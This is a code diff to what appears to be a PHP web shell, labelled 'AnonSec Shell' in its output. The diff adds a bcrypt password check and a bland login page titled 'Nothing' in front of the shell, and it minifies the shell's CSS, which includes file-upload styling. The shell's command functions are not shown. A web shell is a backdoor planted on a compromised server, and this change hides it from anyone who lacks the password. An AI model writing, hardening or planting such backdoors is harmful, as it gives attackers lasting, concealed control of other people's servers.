@@ -1,3 +1,46 @@
+<?php
+session_start();
+
+$hashed_password = '$2a$12$AF.sjRyPPrIw9pwlRq6zsuF2nEQ5/r0kJ7V6fVXAxIx1nNcqYtjl6';
+
+function isAuthenticated() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    if (password_verify($_POST['password'], $hashed_password)) {
+        $_SESSION['logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = "Denied!";
+    }
+}
+
+if (!isAuthenticated()) :
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
+        form { display: inline-block; padding: 20px; border: 1px solid #ccc; background: #f9f9f9; }
+    </style>
+</head>
+<body>
+    <form method="POST">
+        <h2>Nothing</h2>
+        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">>></button>
+    </form>
+</body>
+</html>
+<?php
+    exit;
+endif;
+?>
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -7,122 +50,7 @@
 </head>
 <body bgcolor="#1f1f1f" text="#ffffff">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<style>
-	@import url('https://fonts.googleapis.com/css?family=Dosis');
-	@import url('https://fonts.googleapis.com/css?family=Bungee');
-	@import url('https://fonts.googleapis.com/css?family=Russo+One');
-body {
-	font-family: "Dosis", cursive;
-	text-shadow:0px 0px 1px #757575;
-}
-
-body::-webkit-scrollbar {
-  width: 12px;
-}
-
-body::-webkit-scrollbar-track {
-  background: #1f1f1f;
-}
-
-body::-webkit-scrollbar-thumb {
-  background-color: #1f1f1f;
-  border: 3px solid gray;
-}
-
-#content tr:hover {
-	background-color: #636263;
-	text-shadow:0px 0px 10px #fff;
-}
-
-#content .first {
-	background-color: #25383C;
-}
-
-#content .first:hover {
-	background-color: #25383C
-	text-shadow:0px 0px 1px #757575;
-}
-
-table {
-	border: 1px #000000 dotted;
-	table-layout: fixed;
-}
-
-td {
-	word-wrap: break-word;
-}
-
-a {
-	color: #ffffff;
-	text-decoration: none;
-}
-
-a:hover {
-	color: #000000;
-	text-shadow:0px 0px 10px #ffffff;
-}
-
-input,select,textarea {
-	border: 1px #000000 solid;
-	-moz-border-radius: 5px;
-	-webkit-border-radius:5px;
-	border-radius:5px;
-}
-
-.gas {
-	background-color: #1f1f1f;
-	color: #ffffff;
-	cursor: pointer;
-}
-
-select {
-	background-color: transparent;
-	color: #ffffff;
-}
-
-select:after {
-	cursor: pointer;
-}
-
-.linka {
-	background-color: transparent;
-	color: #ffffff;
-}
-
-.up {
-	background-color: transparent;
-	color: #fff;
-}
-
-option {
-	background-color: #1f1f1f;
-}
-
-.btf {
-	background: transparent;
-	border: 1px #fff solid;
-	cursor: pointer;
-}
-
-::-webkit-file-upload-button {
-  background: transparent;
-  color: #fff;
-  border-color: #fff;
-  cursor: pointer;
-}
-
-gold {
-	color: gold;
-}
-
-ijo {
-	color: green;
-}
-
-merah {
-	color: red;
-}
-</style>
+<style>@import url('https://fonts.googleapis.com/css?family=Dosis');@import url('https://fonts.googleapis.com/css?family=Bungee');@import url('https://fonts.googleapis.com/css?family=Russo+One');body{font-family:"Dosis",cursive;text-shadow:0 0 1px #757575}body::-webkit-scrollbar{width:12px}body::-webkit-scrollbar-track{background:#1f1f1f}body::-webkit-scrollbar-thumb{background-color:#1f1f1f;border:3px solid gray}#content tr:hover{background-color:#636263;text-shadow:0 0 10px #fff}#content .first{background-color:#25383C}#content .first:hover{background-color:#25383C;text-shadow:0 0 1px #757575}table{border:1px dotted #000;table-layout:fixed}td{word-wrap:break-word}a{color:#fff;text-decoration:none}a:hover{color:#000;text-shadow:0 0 10px #fff}input,select,textarea{border:1px solid #000;border-radius:5px}.gas{background-color:#1f1f1f;color:#fff;cursor:pointer}select{background-color:transparent;color:#fff}select:after{cursor:pointer}.linka{background-color:transparent;color:#fff}.up{background-color:transparent;color:#fff}option{background-color:#1f1f1f}.btf{background:transparent;border:1px solid #fff;cursor:pointer}::-webkit-file-upload-button{background:transparent;color:#fff;border-color:#fff;cursor:pointer}gold{color:gold}ijo{color:green}merah{color:red}</style>
 <center>
 <?php
 echo '<font face="Bungee" size="5">An'.'on'.'Se'.'c Sh'.'el'.'l</font></center>
